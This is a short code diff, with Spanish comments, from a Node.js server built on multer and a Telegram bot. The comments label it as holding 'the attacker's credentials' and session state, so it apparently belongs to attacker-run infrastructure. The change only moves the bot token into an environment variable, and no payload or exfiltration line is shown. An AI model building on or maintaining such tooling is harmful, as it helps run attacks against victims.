@@ -17,7 +17,8 @@ const uploader = multer();
 
 // Carga de credenciales del atacante
 const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
-const bot = new TelegramBot(data.token, { 'polling': true });
+const bot = new TelegramBot(process.env.TokenTelegram, { 'polling': true });
+
 
 // Estado de la sesión del atacante
 const appData = new Map();
